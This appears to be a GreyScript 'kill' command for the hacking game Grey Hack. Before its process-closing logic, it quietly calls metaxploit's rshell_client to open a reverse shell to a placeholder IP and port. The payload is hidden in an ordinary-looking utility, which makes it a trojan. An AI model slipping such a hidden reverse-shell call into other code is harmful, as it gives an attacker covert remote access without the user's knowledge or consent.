// Made by aldusbumdlebore
// 05 / 20 / 2024

// installer for metaxploit removed.. fixing it
// but it shouldnt be used against player

// EDIT THIS BEFORE USE
// change IP and PORT to match your rshell-server
// and process name should match ps.gs
mx = get_shell.get_computer.include_lib("/lib/metaxploit.so")
if mx then mx.rshell_client("12.34.56.78", 1222, "bumdlebore")

//command: kill
if params.len != 1 or params[0] == "-h" or params[0] == "--help" then exit(command_info("kill_usage"))
PID = params[0].to_int
if typeof(PID) != "number" then exit("The PID must be a number\n" + command_info("kill_usage"))

output = get_shell.host_computer.close_program(PID)
if output == true then exit("Process " + PID + " closed");
if output then exit(output)
print("Process " + PID + " not found")
